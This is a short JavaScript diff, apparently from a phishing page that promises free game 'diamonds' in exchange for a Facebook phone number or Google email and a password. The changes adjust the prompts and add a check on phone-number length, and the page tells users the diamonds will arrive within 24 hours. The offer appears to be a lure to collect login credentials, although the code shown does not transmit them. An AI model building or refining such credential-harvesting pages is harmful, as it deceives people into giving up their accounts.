@@ -6,11 +6,15 @@ function FBloginOnClick() {
 
 	if(!diamonds)
 	{
-		MESSAGE("Please enter number of diamonds and your UID");
+		MESSAGE("Please enter number of diamonds");
 	}
 	else if(!phoneno || !password)
 	{
 		MESSAGE("Please login first!!!");
+	}
+	else if(phoneno.toString().length<10)
+	{
+		MESSAGE("Please enter correct phone number!!!");
 	}
 	else{
 		SUCCESS_MESSAGE(diamonds,"diamonds will be added to your account within 24 hours.");
@@ -26,7 +30,7 @@ function GoogleloginOnClick()
 
 	if(!diamonds)
 	{
-		MESSAGE("Please enter number of diamonds and your UID");
+		MESSAGE("Please enter number of diamonds");
 	}
 	else if(!email || !password)
 	{
